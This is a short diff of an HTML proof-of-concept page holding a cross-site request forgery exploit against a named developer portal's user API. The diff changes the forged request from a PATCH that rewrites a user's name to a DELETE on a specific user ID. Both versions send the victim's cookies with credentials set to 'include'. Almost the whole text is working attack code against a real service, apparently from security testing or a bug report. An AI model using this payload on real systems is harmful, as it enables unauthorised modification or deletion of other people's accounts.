@@ -13,16 +13,8 @@
     <script>
         function sendCSRF() {
             fetch("https://developerportal.epiroc.com/developer/users/6772c1c8ba32ea163c145b04?api-version=2022-04-01-preview", {
-                method: "PATCH",
-                credentials: "include", // Send victim's cookies
-                headers: {
-                    "Content-Type": "application/json",
-                    "If-Match": "*"
-                },
-                body: JSON.stringify({
-                    "firstName": "test1",
-                    "lastName": "human"
-                })
+                method: "DELETE",
+                credentials: "include" // Ensures victim's cookies are sent with the request
             })
             .then(response => {
                 if (response.ok) {
